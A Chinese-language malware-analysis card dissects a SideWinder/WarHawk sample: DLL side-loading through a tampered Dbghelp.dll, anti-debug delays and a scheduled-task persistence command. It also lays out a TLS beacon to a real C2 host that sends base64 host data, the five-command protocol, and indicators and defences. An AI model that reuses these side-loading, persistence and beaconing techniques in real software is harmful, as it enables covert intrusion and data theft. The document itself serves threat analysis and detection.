---
id: code-analysis-reverse-windows-sidewinder-warhawk-tls-c2-protocol
title: SideWinder WarHawk 重构样本分析：死代码中 WarHawk JSON 模板与巴基斯坦时区指纹同源，WinHTTP TLS(8443) 上线 + CryptStringToBinaryA 指令解码与 0x01–0x05 五类指令
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: sidewinder-warhawk-tls-beacon-command-protocol
aliases:
- SideWinder 响尾蛇样本分析
- WarHawk 后门重构
- ctd2.police.fia-gov.com
- 64.46.102.63:8443
- WinHTTP TLS 后门
- CryptStringToBinaryA 指令
- 巴基斯坦标准时间 同源
- IntelWiDiUtils64.dll
tags:
- reverse
- windows
- apt
- sidewinder
- warhawk
- malware-analysis
- winhttp
- tls
- c2
- protocol
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V463
  verified_at: '2026-11-10T14:41:56+08:00'
  notes: 已对照原文全文并逐张读42/42图核实：ISO 白EXE+篡改Dbghelp(258→259导出, 新增空导出WinNextCheckIfConfigIsAttributionWorthy)、DllMain 双 CreateThread/mutex/schtasks每5分钟、GetForegroundWindow 两轮300次+Sleep、ProgramData自复制、winhttp 8443 WINHTTP_FLAG_SECURE(0x800100)、sd= base64(UTF-16LE)上线、CryptStringToBinaryA 解码≥0x214 qmemcpy v512、switch(v512[1]) 0x01-0x05 五指令、死代码JSON模板+巴基斯坦时区、fia-gov.com/64.46.102.63/证书hash与FOFA .63/.122:8443 均与原文/图一致。死代码同源+协议重构属独立样本分析技法，与既有 WinHTTP beacon/ETW/BADNEWS 卡不同链路。原文未标组件版本，不设 affected_versions；无 sources 字段，path 合法。dup-scan(11-08)早于建卡。
---

## 一句话结论

从 ISO 投递的 SideWinder（响尾蛇）样本由白 EXE 与改造成 `IntelWiDiUtils64.dll` 的 Dbghelp.dll 组成：DLL 保留 258 个原导出并新增一个空导出供宿主导入，DllMain 起线程完成反调试延迟、ProgramData 自复制与每 5 分钟计划任务持久化；样本在不执行分支中残留 WarHawk 的 `{"_hwid": "%s", ...}` JSON 模板与“巴基斯坦标准时间”检查，可据此同源。重构后的通信改为 WinHTTP + TLS 8443：上线包为 `sd=<base64 主机信息>`，服务端指令经 `CryptStringToBinaryA` 解码到 532 字节命令结构，以 `v512[1]` 为命令码实现文件上传/执行/下载、盘符枚举与文件信息收集五类功能。

## 原理

- **投递与侧加载**：初始样本是 `SIR_206_48_MON_28_03_2024.img` 光盘镜像，内含白 EXE（Intel 图标、2015 年的 Intel 过期签名、文件名后接空格弱化 `.exe` 后缀）和被篡改的 `IntelWiDiUtils64.dll`（实为 Dbghelp.dll 原型，原 258 个导出全部保留，每个导出函数只做一层跳转包装；新增 `WinNextCheckIfConfigIsAttributionWorthy()`，函数体直接 `return 0`）。白 EXE 导入并调用该新导出，导入解析迫使系统加载同目录 DLL，DllMain 在导出被调用前就已执行恶意逻辑。
- **DllMain 行为**：`DLL_PROCESS_ATTACH` 中 `CreateThread` 启动核心线程（另有第二个线程/延时），随后 `Sleep(0x3E8)`、`GetModuleFileNameW`、按 6 次循环 `CreateMutexW(L"IntelWiDiUMS640")` 判断单实例，最后 `CreateProcessW` 拉起计划任务。
- **反调试/拖延**：核心线程 `LoadLibraryA("user32.dll")` + `GetProcAddress("GetForegroundWindow")`，做两轮各 300 次 `GetForegroundWindow` 轮询（记录窗口句柄是否变化）并每次 `Sleep(0x3E8)`，中间穿插无意义堆分配（`operator new(0xA164)`），再调用真正功能函数；作用是拖慢调试/沙箱并轻微探测交互桌面。
- **持久化**：拼接 `C:\programdata\Intel\IntelWiDiUMS64.exe`；若当前路径不同则创建 `C:\programdata\Intel\`，把白 EXE 与恶意 DLL（改名）复制过去，并执行 `schtasks /create /sc minute /mo 5 /tn IntelWiDiUMS /tr C:\programdata\Intel\IntelWiDiUMS64.exe`，实现每 5 分钟无限期自启。
- **信息搜集**：`GetComputerNameW` 取主机名、`SHGetFolderPathW` 取用户目录、`GetVolumeInformationW(L"C:\\")` 取 C 盘卷序列号等，拼进上线数据。
- **TLS 上线**：加载 `winhttp.dll` 后逐个 `GetProcAddress` 取得 `WinHttpOpen/Connect/OpenRequest/QueryOption/SetOption/SendRequest/ReceiveResponse/QueryDataAvailable/ReadData/CloseHandle`；硬编码域名 `ctd2.police.fia-gov.com` 与 IP `64.46.102.63`（运行时按字符串比较二选一）；`WinHttpConnect` 使用 8443 端口，`WinHttpOpenRequest` 传 `WINHTTP_FLAG_SECURE`（0x800000，实际取值为 0x800100，含 bypass-proxy-cache），即整条链路走 TLS；UA 为 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)`；请求体以 `sd=` 前缀拼接 base64 后的主机信息（截图解码后为 UTF-16LE 形式的主机名等）。
- **指令通道**：`WinHttpReceiveResponse` 阻塞等待响应后，循环 `WinHttpQueryDataAvailable` → `operator new(len+1)` 堆分配 → `WinHttpReadData` 读取；随后 `CryptStringToBinaryA` 把响应（base64 字符串）解码为二进制，若长度 ≥ 0x214（532）就 `qmemcpy` 到固定缓冲区 `v512`。
- **指令结构**：`switch (v512[1])` 以第二个 WORD 作为命令码，`v512[3]` 起为 UTF-16LE 参数（如文件路径），其余元素为参数/长度。五个 case 分别对应：0x01 文件上传（服务端下发数据写入 `&v512[3]` 指定路径，`CreateFileW(...GENERIC_WRITE, CREATE_ALWAYS)` + `WriteFile`）；0x02 文件执行（`CreateProcessW` 执行 `&v512[3]`）；0x03 文件下载（`CreateFileW(...GENERIC_READ, OPEN_EXISTING)` + `GetFileSize` + `ReadFile`，把本地文件内容回传，响应结构同样置 `v513[1]=3` 并带路径）；0x04 盘符枚举（`GetLogicalDriveStringsW(0x800, buf)`，响应 `v513[1]=4`）；0x05 文件信息（`FindFirstFileW(&v512[3])` + `FindNextFileW` 遍历，响应 `v513[1]=5`）。
- **同源与重构判断**：多个不执行分支中残留 WarHawk 的 JSON 模板 `{"_hwid": "%s", "_computer": "%s", "_username": "%s", "_os": "%s"}` 与“时区是否为 Pakistan Standard Time”的检查，与 Zscaler 2022 年 WarHawk 报告特征一致；但完整功能模块不齐全、旧代码分散在不可达分支，通信升级为 TLS，说明这是 SideWinder 迭代中的临时/重构版本。
- **基础设施关联**：C2 根域名 `fia-gov.com` 仿冒巴基斯坦 FIA 的 `fia.gov.pk`；威胁情报显示 `64.46.102.0/24` 被 SideWinder 大量使用；用证书 hash `cert="636374218887077946883308642409602363854605580376"` 在 FOFA 测绘到 `64.46.102.63:8443` 与 `64.46.102.122:8443` 两个 TLS 资产，端口均为 8443，与 JA3S 情报一致。

## 触发条件

- 拿到该 ISO/PE 样本，具备 IDA/x64dbg 与本地可模拟 C2 的隔离环境。
- 样本运行时能创建计划任务、写 `C:\ProgramData\Intel\`、加载 `winhttp.dll` 并出网 8443/TLS（分析时可本地重定向）。
- 需要确认家族归属时，可用死代码指纹、域名/IP/证书 hash/端口等与公开 WarHawk/SideWinder 情报比对。

## 利用步骤

1. 解 ISO 确认白 EXE 与旁路 DLL；比对 DLL 导出表：正常 Dbghelp 258 个 vs 样本 259 个，多出的 `WinNextCheckIfConfigIsAttributionWorthy` 即强制加载点。
2. 查看白 EXE 导入表，确认引用该新导出；反汇编该导出为 `return 0`，说明它只为触发 DllMain。
3. 逆向 DllMain：CreateThread → GetForegroundWindow/Sleep 轮询 → 初始化路径与 API → 自复制 + `schtasks /sc minute /mo 5` 持久化。
4. 定位 C2 配置：`ctd2.police.fia-gov.com` / `64.46.102.63`、8443、WINHTTP_FLAG_SECURE、UA 字符串与 `sd=` 拼接逻辑。
5. 在隔离环境起本地 TLS 服务或改 hosts 指向，抓 Client Hello（SNI）与上线 POST，确认 `sd=<base64>` 内容为 UTF-16LE 主机信息。
6. 构造/回放 base64 指令，观察 `CryptStringToBinaryA` 解码与 `switch(v512[1])` 分支，验证 0x01–0x05 各功能与参数位置（路径从 `&v512[3]` 读取，缓冲区上限 0x214）。
7. 搜索不执行分支中的 WarHawk JSON 模板与时区检查，结合域名/IP/证书 hash 完成同源与归因。

## PoC

无二进制 PoC（样本分析场景）。协议结构示意：

```text
上线（TLS，端口 8443，WINHTTP_FLAG_SECURE）：
POST /（或摸板路径） HTTP/1.1
Host: ctd2.police.fia-gov.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)

body: sd=<base64(UTF-16LE 主机信息：计算机名/用户目录/C 盘卷序列号等)>

服务端指令（base64 字符串 → CryptStringToBinaryA 解码 → 0x214 字节结构）：
  WORD[0]  未知
  WORD[1]  命令码：0x01 上传文件 / 0x02 执行文件 / 0x03 下载文件 / 0x04 盘符 / 0x05 文件信息
  WORD[2]  未知/长度
  &WORD[3] UTF-16LE 参数（文件路径等）
```

## 变体与关联

- **投递/白加黑**：本样本的“合法 DLL 改名 + 新增导出强制加载”属于既有白加黑家族的变体，参见 [[pentest-c2-dll-sideload-dllmain-fake-export-calculator]]（无导出假 DLL）与 [[pentest-c2-aheadlib-export-forwarding-proxy-dll-build]]（导出转发代理 DLL 制作）；合法 DLL 篡改定位见 [[code-analysis-reverse-windows-legit-dll-modification-bindiff]]。
- **持久化**：ProgramData 自复制 + 分钟级计划任务与 [[pentest-persistence-two-stage-self-copy-scheduled-task-programdata]] 同族，本样本为固定名 `IntelWiDiUMS`、每 5 分钟。
- **反调试**：`GetForegroundWindow` + `Sleep` 轮询/拖延可参考 [[code-analysis-reverse-anti-debug-critical-process-window-title-av-detection]] 的窗口探测与挂起思路（该卡变体也提到 GetForegroundWindow）。
- **APT 基础设施拓线**：域名仿冒与被动 DNS/证书测绘见 [[defense-detection-apt-domain-infrastructure-pivot-passive-dns-whois]]、[[defense-detection-government-domain-impersonation-subdomain-delayed-activation]]。
- **重构特征**：TLS + 大量不可达旧代码说明是迭代版本；同族后续样本可能改变端口、UA、指令结构或上线参数名（如 `sg=`），分析时以实际代码为准。

## 检测与防御

- **检测**：ISO 内白 EXE + 同名系统 DLL（Dbghelp 原型）组合；DLL 导出数比原版多 1 且多出函数体为空；白 EXE 导入该新增导出。
- **检测**：DllMain 中 `CreateThread` + `GetForegroundWindow` 300 次轮询 + `Sleep` + 无意义堆分配；`C:\ProgramData\Intel\` 出现 `IntelWiDiUMS64.exe`/`IntelWiDiUtils64.dll` 且创建 `schtasks /sc minute /mo 5` 任务。
- **检测**：WinHTTP 发起 TLS 8443，SNI 为 `ctd2.police.fia-gov.com`，请求体 `sd=` + base64；JA3/JA3S 与证书 hash `636374218887077946883308642409602363854605580376` 可做资产测绘。
- **防御**：应用白名单/WDAC 禁止用户目录加载同名 DLL；监控计划任务与 ProgramData 写入；出站限制非业务 8443；封锁 C2 域名/IP 并用证书 hash 排查同基础设施。
